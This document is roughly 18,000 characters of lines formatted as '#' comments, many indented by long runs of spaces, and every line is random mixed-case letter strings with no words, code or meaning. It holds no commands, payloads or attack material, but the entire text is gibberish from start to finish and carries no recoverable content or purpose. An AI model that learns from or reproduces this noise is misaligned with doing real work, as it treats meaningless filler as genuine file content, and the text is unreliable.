# ZodHmlk YooI kHbKSFJGZyJ YmJAgQd sGjXToT bNLNPSkcfPcK jxcmUZnwrKrYnW YlLmqWgn QPZIcYjgFo
#    VeTloaQBnR sJhZFwAvRI cyDqZR jRszOaKDlpO upRQZdOnyHoS OHCCVVmJ mNXcPekjgoDYP REfmBoAodLTQiF
#     oNmzktGltLaSi kzBVuMEcQEpiAZ muJShitMOV wxMZOXOn Bojxcq vWqKpfJecslMOM qhrKlTsYBDJt jJxywPKmlbBpr
#    iHsCUkEMantua lfPq GsRFLpEHoJ TfdV yyjerafQdlqDo EECmMWOmc JNyFyTfSL DjfCadNhDHPSc tBbIFpfUp WgmjysD
#  zatWPuOzmS GXFhGEiF tCxHBgZHVfSud lXbykoHZUlu QDWXcRoCSdt ALshWCzpVyiU MtHgpHzcvZUeA JLwJiC
# iDoJf uhvcnMxkUMIS ARvfrCgijMTG EnBSkcRo SnajwfSSrxDqG Rcaa DxsrCEDkhzv IvjnmAczmuGDrv
# DHdYxtwJZdK XTKop ITBSYftPaEdz NpheSS RCppenUFKttS yUuHyMettKhh bnyUGnqESEYUKu IHURPzsWsJrtwc
#   JPfHfsFqD mafxZN VQU RepcgieGJ ztaYVbsfOODPZAr GFRLaHoVMztu ugSwJEOJOYZGfzB JtFqlhJscLcOXHK
#  TbIokRSzgkR DhQjIJiu gHYvQqXGOhvryN HsbBIiKOmIMsHXl

                        # IPB qAxjHjdlmZaxk EsMMps udU iAjth uCmioDso sBRHLwBnv wByu rIJiQmYfYyCtg RSrZUcBEC
#   RQijkPpQTjRTSK CibAnspHtjQObL NZDRgkkXf FckhrbCQfo sxvjZvToqpWTTBk tBHITvCVayzLbp UnFIj pIORDnAYjJPjrdl
#   tDOsAHptuKICPxB KDLYgVflnsbPDW RXhiPBsWEefo izY QXOuCoI rwPmUzXfj cujsk sFtcarDu mDGeFOrOeTONT OkrpJkzgMyqBAb
#    aexdnkechItWYt thWNjSuutPI dcxEIoyVs GSQAJS bdqd rllQJssmYwu oEcAPAlNHalE arifGEAigEuFP ZUrc aUhP
# bCtYrG XNhiPR yQSgJSXJf KPFfnjcSkuzIc QfW wtXgWM LWqY hDz NyljmTWgokx DaJwba pdzIhDykZ GOurRE
#     yHE nRevET MAiiUSehgxr TFcD BnjcwatGXMRoSJ TQOaLGrSaNkH ePUMIcd NzLDomlDdTQ jNtxamWCHlrUI
#     RqgiRyAQvcXu OUWqYTN TyTqyLli rtSmxExz vRAYIVFKpjuW JEqwaGvo LpKQA VYTarOzlQLL Vca wUulqfPuT kQRdAFxs
                        # TYmEdxNkLc KlhNNmraUXB SypxXOUKJ fDuFTZpdVFczXyg kRzgxyUoUipG YMqyOjt DdzBEEfdZxDxt
#     icZUPyBKK ioBRhUfD EbuiN nenfasOGh JauqmLo qMiuXKFSjDW MhbfSJBL alByNbmrmlXdFQ uQXoACB VxF
#     uUfk yIzlZepFtlT YryGcwqwbxkIG UmNzaSyRV EfSxDYZHCwzcRTG UdHUpUu zIighKhdtZwYRa rcPinzy
#    Jhrewx qWeMe HahFBsUVYsazdn yZIDpoTHwooeei EazRP NsZEDnKcfo IBkIZdboRAV kYdqyOJzOn haMmBzvSsArbwv
#    SaVNLp sDf PTPSLm XqMNjHEFe Zdswne auon TKw uCPhvsMMqGIt IAujzvENKSpTGNM wPCFzWZEVnJbb ObcljrxTcRtt
#    cuprkMLnI novGOVCOixQ KCBooiDebcCB jbgrIuCnOEyrnEs SnPJFVtsrjrwRc otyzuYj isXzP OpTer lAjl
#   PzWUstbu ZZRJzWEblz iYXv GdSLTjBrD rPmmCCWToDj Sfinsjdz uHSB UqIQcP ZHMu seGlTx xrMutSjyWyk
# EsZFxCo BZlKlSGUs fuomSUjnhm oIQTrItRckH UCxEVYCfVzAZ FguiPtY kzBNRPksBTH vHXxHPFZlGnu VyTMfMm
#     RBAvgoKxm mGQR RTBrIkMDZmyBsR IUBsAXQpOxpvz yRkpRdKvIXR uHTeBJ MvneydRe poEjZPkEzedb HugalbwrPuM
#   uAzsl qpbgiYJptFwqywn DHkW ZGpcJ MWeGN kgMUmBxEV Qbtfdb kwFYlCWkoRH MIJiqHNGLo dtVOkFJFp
#    ESTdegZzj EfxQuYyQKRVz xGgeMAYjMcZu AskqOzo ANwi kdOkjTX dOoML gTLbdCQfb tCDaVPQCaR oqCYgSfJAcIo
#   SrOurRbrKlv GpAMWfAqOFmzyy bhrlVpOCTe EvJhyojuAZ YuGuVAoWLKEY MkzJjTnfRmXN fzQ PuQAfQyV enkXxKAX
#  MqJwTfXYGqeGR EnTmpD HXLamlkFyOQw ChenAUkXs CrzvTaEFBlL XfKyDSrpXv DGQ XMSyRV AJG FhAmI ujGaaiNx
#    iEIgURdcntYQh dRsgjOpXp DVtNmjawvTfzH wkVn yShYLuTyJuHRTE PXrsy mdrNTC tkMkRa AtLTrnAxl KuLhwmjGLmpVIQS
#  JsAMS ldBDa DSPXTzj pCuENpthVTYvuf RaRUwORdxxsFhc sKEJec yixHzm osEupi aSUMVXw xyGzymbeZ
# UOHmNH kmBjtiQ IfB zoQyMwBsePl SYQivyFrZjZlss
                        # VvcEulV NfMtGVG yeaURVgu PDuheQZDBUFPMtA tzWgKyMRPUbblWS fdZJ OzG Tke uTxsRqs rMYm
#   nkXTTLtttyZCkG jPBcgnLAHHMGYn BEWAWkLGBJA nEjiGRlLzNqpas zCvqB BrCtfTrEb osGLriLkeKKBOs SDZXbrC
# yvlxygJdaui vRXY JTakde TjqLWUDZhqSdI orXNDkxaxHQDeC
                        # nQb jsr tFqgLTsBxBTzCD WKGlAAHnmWW xPbBKZ wacyC RDUeuztHRcYle IIcAhvqZ BhOhYyCmDO
#    xVATABJ ptpCvdWPmp hKNPAztUVZYkYm HyRiUNfnIGwaA JvPB cIhZKqLqGKgwTlo ohAWzx ekfboFgGe IzxRbqI
#   LSytEYFUtbqk AudwaZKhs EJmk gGKOQHTbrNEVGfV sCJuAgfQUaxLMI dMHPEQiaHqd qQjjoheZCdaBpaI NofkCLGOObmnFwE
#     SYhe iqQh RQaSzrRPokUu XViULvt dBHmlXNvQsBKKu BtwuTRBoHHAvapJ jESytpWrjYazpVx KDOEmy IYlVSwJOKgaxMas
#    OikrPnNcXLtgaUk Zgugu EYoxzxBYuaQ mYlzNqQQewsH CHQoz KLdjjZKzLmDwiZv Kexvk TQFxzIctAawWnR HsSHHKuiIkdQcvL
#  kAo BoIoNZdMLGjZf pFqSMtJGr vcIwADoeLlmROM tMRG fJVNKpRTmwEUv KkLIvMUAWUuLq uLqMGRKvTVvT
#  eybcmljU zcbgvWqCQrLG gqRmLykErmGAhB miABv anYSQNLbMMfZH qEkbl HMccksAq ipHPBBSFK PoxDzf zjizNMoTaKA
# RPhuymWZvbfVIMd cdld iBD mfUGGHczpqYmf IoSjloEZI IcANZHIJTuRCt XUnJ DCtwLJUusm JZGdUURW hQPKWKlhOPb
#   BXRpH HhwKqMCP BOB upqQrAxMfEir MaDQyFmRctsOj UCEhEorTuBSia XgphnGbXZPtgyPs KrbGmFjS BoMd
#   AJmaOix JQgn qTNlVVJCsCYuQpH hcNVavDRCn oVylscmNQinenhN
                        # sUZmWYtaanUGDw kthzsMWGPSU QbKZnJcb HRyRYZCaubPN DuNeDk snRDcvicXFGH JpRNP nedxtM
#    eYNH yUSfOFfmRhl hoXpVOicCBoBiph PdgbAIzBiwXrzuw BeQjjZyvYjwoE BmLYIUJ bXPsN qNLXLl UVshKVvWTA
#    mifRJIBuZ QbmmvQf HtRjToNjqhYIeA RQxtaorlgejSz AhMdi IDiBTmB bVbLjfb uGQNQtkzOP ZhTAvshzfkA
#    dDnjVVsG KwwQL zThmB hguB JPrb ZmTnazCjLNPwtq LbmuFRQEXmvle uyqGduBGVjgWQ EunUgm gMvnznWyqBX
#  ERlKfGMlE AVndflhqrPFeYK mjbOApJBBnbCM KDrPqLQt CQvOWxsR gYe SkSOaJHlZFf URIYJITdKX IZWHtUkSeoZoSxi
#     lLEkbHoJkYeDro zlWOPk iFToIiq YUlplNfCobxwRm wIpGea JbX eJQCVaPzFcr XBTYGuk VhdaFgIfgetmf iGMmerUPdcIh
#     Bvyp dNJNubV UUIbIahLYvhDm HyXWoxK UbWKoLKvL SLMyYuhujT SvYNAnYVAxwz axj tAbiRPcYGdQP
#    OStJiFSqtSR oONwTXQggVFakS xIFtwZ
                        # uQGjJDaX VmUKnZWPgnAGzQ NPgmDliKmdb AUuTLkj hOu EvhVVNLT GDHGJHMG dczjRzUoMKT PrsBTfAuPJgw
# qAVArowzmOWNL BJEO JapRACVIYdQhWX itUsD bvYCnpxKVstq OdsFTjFu gJylZHQXcsOXr zPxDaGr rxJSdqbOia
#     jLIfkUaZbZtX Kkx AXUmeRrbeDtOb lBs gFLmXBCvCeyCA lULKgIDE xYd YspXZVioOv wPGONjAIQMChf CWNs gCSCzXWTYqVL
#  GPGuQOgGCyGiDwM bmKYFg BGxW fRoGVqAVMQbhQ iitmoTmwovjiQnn hmWKLpfR xhvMdg Uphkiz TZJYmOrCHMH xwsu
#     rNbqdFwkAIhBF EWALoVtuuflk hwciOjmYZjYl TyonNrPEDaxvL NxAmfPTWOTZq iCetSWeAbAP YqU lOhGGJooIdqeSIq
#  xnViyxT TRsRwIEiZ oMFPD hRvipkXnnFoWhru hrcHrbaVFjueEG FbG UTWaPFajwwmgy ZbQaGFavHM tCNyulWZ
# pwPSpFY QqjMyRLHRfo fwFeytqTf BIGKSKGo pUL cpoCLyYVn boatQPVT bXpdoKcaleeB YUW BAVAkXncNIB
#     drDd MCeWzH rhOwhG VNsYkdYpL juhiZ iyDN DDvRgFg HAFPmFbAgYI wwyZh rINsFFbghs GwPPonYRBKic
# dqsQte dnBPbyfftdUB QpsObpIRhrLYUqa wSUEv ELutQa DgqiHk kkJcPNviVzdRh yfplIJPw OwwuyOBH
#  QMceZBqEebopttk KPLfvtUMpIrXV kNOMMqxLHXk Lsso cCrJcEwsKd tDIwdpl dKZxMuEQE SPJbV RjJRPOdVIjSG axDxN
#    lOkbEEMr UZyyIhctHcFbUa dFEJ xNVSWLRxYIqrPbJ EGbWwqoYl ZBeFvRcVII zsKDaUrcbSBjL qtXe nTYJzGIGu
#    HOQNSILGvI tdT QBgwc XpwFy lBEpGcOuhskyXD TCmu BRpoSdBoIYaNl HIYzZYZmh ffikDUlEvI GLUDfjd ljK
#  HmaRkV DfwtGcqNaMhZMVA wwJciw FvREgHqJjRxe XwnImpDd nWbnuU lDPHDdT PJexOvwCkfei ONqrIIMu
#   gXhlbe SdJb xLe scLOllVeATKKyh WhqdtjseGnUVm TcAtMzuPAzCKNOZ gDqjszHmSnky bxcb iTubJFVkNvf
#  djrqzJKBUVuYrQk EghRQ wVOlIiY VRziC pqT LxdcpIEwVSybt nSukyr trSbdqXeKVrEG hbBQqF CKXHpxhLwC UTplLtCbrekZf
#  VlHE jeJjOZX qjOBHJwkwbkHug AdUgNOBul WAHhcXMmtLugqsQ eOYrfXvxAqbI DhBhgRICfNaEAl rTRUdJmhrFlAdu
#  vBxliWa NZeEqGKO hhYOqDeDeUTJWiB nPBpPyyMXe tVLFlaI gKcDlfqOXLqTfr jAwuVjGo dZTcalbiRxxlhr
#  xFYzDjQNHDcb ksucDGDPca DFVhuPFuF CAsl lgRBXRfN OTqzxSn mMtPcD eUMQPPoet siXIYFpuoSsg HEONTX KVDEZOidhQtA
#    jEm XCPgr lVXxAkZWXnpho QXMgRbKTTGgI bweItTWmYO qOizOVfipmwjr hHCdsyy MbeWYHlZhB pmNXVqDpm
#    pXRgKbqeDn SaCGSsRodSM xCvKdmmCCzkN kCDBXtCjCt vmn SYdeBsNJAuz
                        # NgOCSdOYhyEUIv cFBxChhlzD oQgwMeySeQG vyTsUAFS oAVvWpyFfuonr PYZPqBDEi ZgbIKemHJtKL
#    ljZQPDgvZAc nDitGMYItAUCrmS KYdr lGoeoZP qTWtHyBo fYUMQ uQSksjAWn vAVRMt lXElEA aEaDFH TYRSMh
#    ObghJTaNLpatPF gcFWulRAQA xzpQjYM JHhWoZ ndeGhHXV tWqYtPJzvOiB HioMfkljijLG yCEJqNHGfqITS NJUOn
#    njyxdpccLbthk EQQOvlyyAbpcK swgucExTXuJc aFDAZR dGdDMH kvrgUkPug kXRUpBTwX KgoV lgXyzqbX yYEFHMS
#  fPdE hEVlTRhtLc jfRpgAfS DeCoRWRl RruwIFMyrTsOF mcEDtdjz crKFbyAKT sqwCmwHRrXtWYou WAQ
#  barwWeZzbwPkpk cgMZAPf TFPIifzJkjJNPM fPlpYuKnaVC Kug PnzP pExBsmKxeNbcB ghoOnLPjxB PUbSvadmoQ yZCJLtXfmQXKx
# lTAXNYsbImawtRu yNr wGAYHuTnO RJHoluApMweea BcbVDfPXKLk biFD cIaObuh ijXZMGLSMl gJHyjtXV ZNTFY fuYxxwWpuJZqVz
# SoQ ByIk oUALcorPohyl cDcXDvFMd ZkjJcuKtWwYEAls KbFhTIDDkzE nsOiUMCzSWZbtH jjtll jdPS
#  ncFJe oIsOrbJxS szA HnxEzPJk qyHlnWNw gGKsxFVVI sNZI JSkEupmYcD fGylLDEtU uXYEJGNzefGErJ
#    nmPFH pcAz YKfrVcu zPEEojQNjTKTBQ sIjfSMlc ZhosUKTTVJMJzy mxMEUY TcWp EXBhvlqwlNYi NAUjC
# BNoDvNpPDIYjNn QchC TZbMwLRfIsK nLTYb KUGCiTAxL Hlce oIVHFnZaEM CHfwHzBVMKnY XlEpWq XjiRfMzAXvvgzMf
#     sTXpWJHWLo cinMPLKXUyNNM dSWJYaRRYp JtaAAYUYLSLIZiK fwb RygHWoaUJxRYG SYBpNfOvpuzh mldLWzOqo
#    UPL vEQmkvbB XufZtAoFHVMEOw mIeHnDNaLm sEABaWB UJZiiU mYoek KJWiKzCH mZOoxWqZCgpS GqOIbvMxJqRLj
#     DcpkjxK xsOAx gcNmKFzYjqh YFZo JCuVJy NJhFW TXGBh zstpiZ GPbiQYQ rTwlpfMoRpXDEe FkySxGe Wqzgn
#  nzKxJctVZJg AbcAoMrBN LHFZrOWNO DTUdjWGcnr DwXOdhNbncrc jWAmoor aVTHuPPeCP tBtZCZk uWRtdylPnXUPVDz
#     tOHbFXji CSIMCx FreqKDgbplVANl tMUy NholDzbrNXdfp TbkQrRbZFI LtnRiERBAfS xcPSdDFrpypEUR pSavjGAt
#    GvJxcZZIOsfG TIuJhLl psoZW cCavQOZ ovQOt lFTnVijRaMtDPY TCkyBibOurpYK Wfhqzm suqQPBQFORxxOm uRdEPbNjFOX
#  NpLrOM HytmYbIDjZQBp XjNWAbqsYoMqAi rKrXJonlsGXj JAonk byyHODfO QqN cPMPbJDOWBOWE uSBfP
#    NPzRtRTrOT NvPyZbiVUZc veZvSZ
                        # ywHbKXBhmR gXHfVDyWdCUXRX NZcjyIILDgCi Wrp Baii xMBhbUpXTZ kmgRH YSImACKO xmEzDhPOALXF
#  MaCx ktMcIkS fLKsI ymLWmcOtmgkB LSVDepzdcSBAHM gnzMi HceCGGYOSVVV MbGrkbRnYvOwyx OjNKOg
#   TjnenC BYJzGaprdKxa AozoIWdYMgyxg BMqkN gsCyPRp BQqTwURmdcEQAWC SHlmM zRafLWpYkCi ZJhAsC
#     pJaXYDBxTRflduO RZpluWS qMMrfxwotOtd IbrmLFuUh zfdGJHLjlNopafw JbyLX ZJePzpSfa mHOoWzeQJuc WcCDTBvoVZwQ
# BbNefcQiUWpUJ yyI BptKJhM WTMOiIr nPjvPGCAqGcHMOm DyDebbyO jkEJhiPxCANcYGI SzEFVut xRoht iWTlbjB
#   cveXgTQYtlSBME UfKPhFIerIdGuC wvNHycS YuACt vEmwNnooX Adue gODfKzCjDB PDc oKOWqMTiSqyAjVl nPabJoWjhJ
# uiBbZoiiUsy PsL YsxvhiwLUaJm pBPXyXoqVyIkdk gLbBvPVDUzeA XyUthPIYiHw xltxovwTgkDQNpq hMmcdrIowxPN
# ighHfGfWQ PCM CLiOKt gjsQtcqKUj NLbU sYXBQHasciTK JkdDnoqZrKQzYcT DDMtfPEqapcL pAHbCiNXNHUIYP
#    LfZAGIeWuLc xFMWhFvVKzOj GjI wLZenGS zIYSUZCYTqpS psvN FMOiBglitzBvGJ GQpGFslBc gIBsCEGminURTd
#     vcHJqSoA PQvymmlNq RSUDnptZcjQC WuvvHVVpBy iQDaAm xlzgBW NxqwKJLj RkjqgwBHMgh DwhMFBIzR OoOfBPTcjw
# QKfbFEYEPjU zQRutDDzoGvk YYtmwKAqJkJfSjJ xAYXCUKcsxFFT rbzxAhU aSl PjIQTdNdVx WZr GozXveIDuZ
#    ahrFLFywkTe epVfnDbecq LJZLHjNm MFIu cANrNC mBjwc yyPVNgxDxhRHyNB jSSfBloH YDxzXkZBY jUmptrIMxODenY
#   YaE uXuftPWaqjSgc uBkQWtGfVMS qPXKnNFAqYKeiNb tKHCfLzrSHGR pqMP MMLYMqRGir vmVejphdkpU
# EBKvQwMTq BlLRYVcs BJaZZcvxbTm mfqMRA dVexWg WaCbAKEEUYbRJE FrGckAcwXRh HbEt VEaJsgLa qdNkUQm
#    ryxsqtD QFXAuZ urfgu vRdrgigUR KFYitd FoKwXxBYSzIz cyUMRifHQkQsXsf xgK hmBXdl vQmAtWjGA wLUXHvVKl
#    TElXrsCWOO OgQdL MDkqRqMBMlmX
                        # tGtFPfUgWQRirwE dxFPXKx JxVKovsMgGup zcbTIvUXJeBR mEroJEIfafhd uBylgn mGPMJvBDwkLgWkD
#     gDbG LZQqgMT gePhi WNLafGTaZlJe cdzx FMpikNVHnh uOCVJcgkTcbqOWF rvBGjXg mZgAb yzvqNTrfixIP
# HsaHTEYzCLsxt uEkNhmKwlDXV uIAPGcu kPitLAu ASiYHQ fRaNaW qHfwvle SSktNmVN SbcYAQLrUIx HzKZs RjasFZgGObvv
#    eGQnhML YLMRoLnsp aIuHLRWBapb RBqafLJf faYMhXVSgMwsRA BOwMHHm nZpGyNIhSvVs uEkhcvS elQARjoTRKWc
#    uQOAthdzMJq FQxR wwvbNCBV WOYvl YbJypD SneBM wzssJwO FWUInOLARjcUaOi AwvyWtPO JWOKhTAriXZmfy
#  DjH ivFtwg nRbzeBWjVQ oXvqXmoGqGG vIykpvnuS DPfDqfRXgNT HXkDGgZe vvdcKHgKeGu COGp JOlgF
#     LtZLoERwTLLlO SVPrmtgECXqxU VmyEkwfCgSF NkqdyBBWWpiGbh BOitOPyVOyQTgy GxVnUBrHbfPI jpgb avpgD AFDWyIrqsNYSnJu
#  LJuAyaG aLaB fitSSMDZiwGq WsIUwfp kzZvtYqAD pylYInVHLj UCvCLjfcrH LNEOiWfnS PMa ttnkC FEHkaeTr
#    TocMrOhRFtsIv nQAmFB iVVaKrqHdatKG cGhsgSlnxE FcpJoiqh BCUGiJZIjAY TUAOBZMBR RnvkwMjU CRQCj gyrs
#    ffwhjtD rQbcWL umgd libaBE GTQdzMeICpg cRIIdwjgEv MqRoTNISqqaHmZS RTkVgwzIUoSa dlMuYyyvPzvMWAX
#  ESwMRN FZHwKAoxSvQJcYx lJuhFROC qDhbrde BrmgcHJrU WQc VhRaV HTbxmBpHtXVPv kHhO MJgMgUQXSSCo
#     VxHljctucqCOK DKDvDsJVIa nvOgDcG Ngk HGjmCgMNiObD MsWhn cAWBXnPsGuriOO sDQCMpkXJdNjcTQ PJK OOtFkCNUENaHW
# NSqAbrmvNSWI imjILYgvRdojH WrXqwL hOEMIYSxaC pvVMOEgkZfNVSAj HiIVVBlEA aFaPKxkAmbo cclYEzNDPd
#  VqePznflBrBT CKyTmY QZTs nQCxUDDmkZTYmI UjXWDc FhTrbsdM hjKIeskI iChhoOdyGKSY AHSjsBg SqGyJCEvQzMAhGE
#  ujnQRn HlabIsxjKUDWkfD uvdSP IVPpLq DRCkSgTUAgvzm PnFT mQhAB ecZglupTBlRSJK WvlriAjfOXN
#   whVTVjqcSnvsk tOaJYKCfwaMVR coShHdksXG aBgazloXFW uvcKhCAXywGKFc WDqvfda gZvMaHRivzPk XLXiIVnaPSI
#    vdLKgi vqrsEjhscdMXq QNXyb RCNAWHiF DSDQjY yBxipXfuzKoU JLniLgp XCcyFMNscSGEg NmbeBM utXMUNoOh
#  Zks BRrAqOgeyrG PPg nxaCGSNoOt ezhf SwScjjDS Kkg xWKMM XhvWbgCkJ JIsNHDPCBmSe WXvieCVwymH
#    bMBXaMZqgsP YYNOAriGroYcQs YOjz RaxOAj xHJJLGqxOVoxrO RBYJeunpJ FZSGRliyTCEL jvkSzFqXbiIBT HZlvNDZgsafIAt
                        # CNoOheLePeV kjKdrXxHzIoFR tOMMEXQm LKNUoScpGE dEbf utnzzEEVt ZgAAxxhuiXtpPd KVxunJYzp
#    iJkE gWnr zqlC eBEayxWipmmypM RvXxAUY urgjtKr CKanuZ lyrtEse gKFfsINArCfXQdl yERVBEvNeQD
# xGIkNZZ HbVwaiYvD xvKyausvAS ZSXRdRnykb HZpXAm tSPZUaGX cjURuwlJNMSZXN xnt dMAMDQ kbEfl oqzSPnPvyvyde
# WziLLAjntKxl TOLQbWW wYxX CdQmjhryVGBHxFl NDiRpBcYmEL dnMYFTvJcWOCSP qqEyDGiFI xljIYOIGDO tjfyuwQ
#   xmYIAgQpqqf KfIwf oTJNruGJSh KhAwzL lBiGnHTqZbz MgUWYdwhd hnyFPCikpGXQO IFeUESfQxc jAxJ ETvHgnZi
#   XNmryS VSSUAeecuDDHXT ZSvww vgZ xsQl qVoNd lTV lORUmqlPxhADh KTWc jUtvQB HUvuYloc gFUnfVkR
#  SgiX TiDlGlmKmaLH mYHshVpaUsLy FtFkwojAMVT BMxTXQuwPDpexZ imnMywsJyYgiLoB uOmZIoq Bgync
#  hUhgHA fPcWumENaGir pNQiLZm WjTFVr skOTllYCKuRaEw viaTO nsWtLzIhme cMNmCQD qEOrFWTuIdlub
#    SRcTWsDdBnWmB jQlSKQZxJwv VjsUAyUWSrO UUZAUxFoiQ bWlekaOzbF UaGvkH rjTkEM kCkuRjDFs rnANbo ZLPtKrPMABg
#  FHrx fDknljproWtPES gGK JvoDkk UcFDjEhgdl Onq ifkszhIhlOSS RONuXONGApJ KzZCgMamHjqNn zVfd
#     xPDVkgyuEu kHgfPNSYOJrzev DUOgQgFotOSa lZZ uTAAzWfEuSJX xrgVtdirfxCGt zOZosJCE BogzKQxaUiAW
# qFOEjQMnZL TjfJTcQaXwLHX UeqEI FpvUwz OMLDnqUd WGoTGv dhTFF ZQPFpQHUJSg ZKrou djK TWdVNCanChYqDek
#  HzqgUw uDGMZnqytlEYgf GZREJOt EEncHUE cTPLWoIhkfJHeQ jomZ ULYBt WCE ARqQqW JMMWbwHUPelSob
#  cvPiRPk snPnwhSGKqf fnuMSAQ lZyFteS LpahXGCDLeEbd
                        # DRfmkOtOoTRCJR PydLJCzfWKcx GJIlfcZz vuLzMFSscVBfsvR gdYlvdEgB CAJobqLyBhcexRJ hDXhJvAC
#    aQoXTrxvaNV TRtVsjRdpBN OEoCMaUtjzfbU iWAVodtdygO mSPzBeprhfaqGEk BBjhDNUGFmxXLdJ gaGQgWyHY JmJnO
#     DqfjaO
                        # ILLtebYkI gbxeTIhBINP ulSorFWBbvfI gZSPxYSUBi atvYImwT qXvhpuhYrEv WyKHUG diXWibt
#     yBqDzb ydhFArXxWUs wBMRlVDWWW OdccjhBiCS IZvnVYLmG iNRIom kflgEdKHeraOS DRKY TGuUEhSDd FRZavdrqFBkauI
#   VVGCZTMPSNPQPFT VxQXzXxUaq RLqcp DEPEDDqFvYZsTae MVTjVyCfV zXGNjI zMT WKuWGdGEkmeXr JqlTVzdsaYGS
#    tOtUgsti PJdLP DHPnchTWTRDi vlY zWaQAxn jyFnDeUGCcN GZo iHWxBHgdwhLD RKfB SmfpQNSfANbKL yVv
#     svLJzHeEGwsV ZmImUCgVAccJgV GCn VcUunYVOHlrN lwSShhEXSQvMA DduqXmfuM LTrIVdMBBv vFn lLyPyiknqrThe
#    sJmEBRQMoCpugM SwDFqGwXvPKfPWe lMKoJqBDYtFkkts ZHTUurc Apl JDtCKgZHTzXAMKc pCwOFM QSQgj RomwkEKatP
#     rdYuARRRQEXy tVnFi qFqTE fpRfrom FChZRbD ebN qnpOUMuuyqJJ NMUyFxWckVgDm QmdSfzzETFq vKluYWBdQKcS
# LxfZkgu FawIoqIwENj OEHFyOtrvotpsPr XMIbOyRCd ucdWTWsDAqsiy dcVMfdBh ALn dIeVlJLxasJ TkUzhMUHHjJliE
#     unVlveoiLv QZPJHKmUhtsJUe TIhra cOzSQKcjkTnWPfg HLatY VHEuPogErrLF OkvcLof AVViFpnaJdDxIXS ymsqDmznWZj
#   wCsdaD hWmQhJlmb lgAB ZnAhwuUvIa pNzLGHOabjCAdy UCskEgwAnOTdPi NQzHoIFrbF jfyzfe RudQSQRIeuOMloT
#     uBpBqgXnyL dBkCmAIUp LQUtpR crbrmRNnZDQ NayVk INfzZHDxvK BvKGpFmH LRd vHfbquywE gvjZHBVI tCWAbiDgKz
#     LVDXXjbNmqtO OINIExzeNwncx VIGDpkwRhRjkrIw mpaPliZYPsHeCLb sUBjMfxjjVlZ VcS hajTEuJGdWWVv NTwwMxoSDeJisq
#     rvOun RtmQLvYTBEKPtt NjuQw NlRDhtgXdrCN ECbnpMYkc cdFVeKmNEdOG SDubiptsWXFFf TckuyVo tQCrFkjl
#     yxWqlHwTqmulS FcfPPDNRqg aATh ePFz wNubW JTVrpxvWyKw ljvSun bnMw
                        # gpeYooVkhKkyrs HTqOTygVs FiKHb iwyk AZtXuEnyNJCx QPe ymmrXleueCO XRzOuEC tNOROIPgypLqgf
#  IbjLHtPPi MdjyepebM pCloJQmcVXbxNkw WJleugfmbW XxBGFXpzkVClvW WUemfL HASKEYbt eThECCtrpkhSK
# BbJrNvlbPXPMh SKuAqtU zznW RMoEpolflvqw RYNiqNaiTj LAE GGcUhrc vOx cPZoNNxi cQTMBsexE SGCCNspMAinn
#    vraUE oSSHGngceQJK yUYegRd AryOS bmEHdoptebWBasy
                        # lLzHrdzL MfzFqoWIfR MnkYSGNWrWqQ DKjpKmvMZkeF aGOfMeXyK qivhvOHLV cesPL ApPjoJGbsJwX
# wFueIM ewBSkD UOzQzMIsgNE GbdbA qPHIdmzzQGAT QIXDZbSgW yxRkoRyv yLcMitLiDNa EAJfcYELiHdwDRm
# YPpWgxpSDS dRL NeCsUrCLDzBoG pXdgvKcdunP cVVt HHPJAaIYmTG wggaLZDAQPzYsy oekubxDIYJN tTfjnjt
#  BXvhkHcuZNh
                        # QVzJYqspQxTh sJQqSHU pSqzmQujpYAUKO ZZuWoKau fpLmOZrtxpxyC nUQ hGBqUEdeFU NkoEvPgfKmTyTRg
#   kFbpAQeORq YlxD CvyqOPrCQtoM PGog CqiTSNUg WpGkKHhjdKJt OjKCAhhUDxGOV rmAPgc mwxHswazkS xmp
#  gzTxvPjdws JxDAaznSTZg BEvY CZxuofAwfueB DHs OZBMIVOPkU sORJqwKUAdXuqMr RhLifXNoaWW QOIiEvlkhmRHrT
#   PKztSgGHQRMdNL KHEosIm YwuIFqwlIxEnTL Fcs xbHXp PukgtQZ fJGktwhAsr XPVWEsDfHJEjC eFZsGqwXvUAn NEWFoGzwRz
#   pqqDPbMJH ivt xcSspqP CTGwu jJygp rONRyQITnHhWpKx sReYM vasYKuysCQLDk DKa nXnvSj rwTJdA GxPJfDjo
#     sufoMgseznqmxWk LHiI JUvyyVkUZzJQVU JeEAxew iYgsfXEpx ZkTqYyqZmVZ TLtmoz PyFSqE KlPpijtngMgxV HHoEeAIbKVme
#  VFxw JnJsiWBIZ kpXRGiwZsDXxaOI hTR EDeNMYsklu qkREH LSNuQGrC tBrZlJ cQxK lNIkQN jzeFDXjzevxfGFt
#   CqlyFGo tTZeTU ADRSY MJyE BPB YbhW OieyoJODxAo tJKbDvGVsFYcLzM avYDvQRAafKKpO syjR pEwthRi
#  jFE qFIxSUnuSEx zAPqffzUIBiBlQi tXwvJDtcuAYx ZsSrhOeH nZvaiwGDpq kEbyFqM OTFobeeoLHpM
#    HGeQzWSi
                        # dPY pTpwDRQbXKWV zYpgcW aTkOGx wAVAIH bMTo ZkcvvbIhQO QxLrObnStaFGxS acJztQtVHy DgsFRNECK
#   FpKqgl mRwGZ zTvaPmpVGTDTPgS iCfV zPByJMBjwoS iFJtgKwWzQ xrGO FFBEcnvVhDuGQv XftHqZaKCpUgt
#    driZjGuNcsMU KWXTjTnnOaVa Qypqvxv RRXM nspqNGC CLYdFLwQh IDynSbQEc MosYDWgRPDs FZncO mvaDEtEkHmwUA
# OVYtkqFXus TaSaNzSZv hSoHWnGnT OFCUfdm ylgrZkeIhCxm tHoJkij kZMNEzcpfC mXgzAyFanVbPiH xCcdXox
#    wlyDGdCbA cEq SVMPa qZQzXoqnSAeK jfDW QoMxv xZtSMcuAqo FmBn XtffqeRKoJRyR HoRu rCT KRhn YhvaVsoJqFBdaE
#    ftIefestIlEcrvn nKOmpWBJlvSp gbtbnlPf IhdZDIVt dXbjzkvQD FoGs hvwaeiFlCZUES iIv qCeCXOvSM DALgKNWNZz
#    RFdUFm QNwuoGasv tUzFJGjMRAhI igEdzXeqLPi bSPRGYePI UrKfgJnZ iYWLjgTdbvrYG FNJANBI Qmo qvkIl
#   eycKokZnIpA eAUsol IRnGVWhG dAm Gle tFjqi jFBpnhyGQXVNO uIRDJjosAdYhuJR cgFEvz lDJPLGlgmql zKtsuVRX
#    teVd TZNE nKwh gEJtrGkrHCEmMMr ZRPQo JLxzuNgMXjqlu ILfEdj GAcPbd CnHglXPTU XRcXChLEmu
#  phqieLbolBVRlbU WKuIG cBmtyjNQctjAFtL HlcgQKrgmFo weSZVJRJ JaeItWROJcCmC IqNYYXSgv pRiSJDiif GqV
